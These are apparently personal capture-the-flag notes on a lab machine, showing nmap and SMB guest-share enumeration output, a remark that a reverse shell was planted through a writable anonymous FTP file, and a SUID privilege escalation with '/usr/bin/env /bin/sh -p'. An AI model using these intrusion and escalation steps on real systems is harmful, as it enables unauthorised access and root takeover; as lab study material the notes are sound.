...
|   Check 1 (port 50124/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 22835/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 40742/udp): CLEAN (Failed to receive data)
|   Check 4 (port 42886/udp): CLEAN (Failed to receive data)
...
| smb2-time:
|   date: 2025-11-11T01:36:47
|_  start_date: N/A
```

Anonymous login was on on FTP server and a file was writable?
so put a reverse shell and got a shell

SMB on guest session:
```
[+] Guest session       IP: 10.201.54.164:445   Name: 10.201.54.164
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        pics                                                    READ ONLY       My SMB Share Directory for Pics --> 2 files were there
        IPC$                                                    NO ACCESS       IPC Service (anonymous server (Samba, Ubuntu))
```

Found some SUID bit files and tried pkexec and env
This worked: `namelessone@anonymous:~/pics$ /usr/bin/env /bin/sh -p`
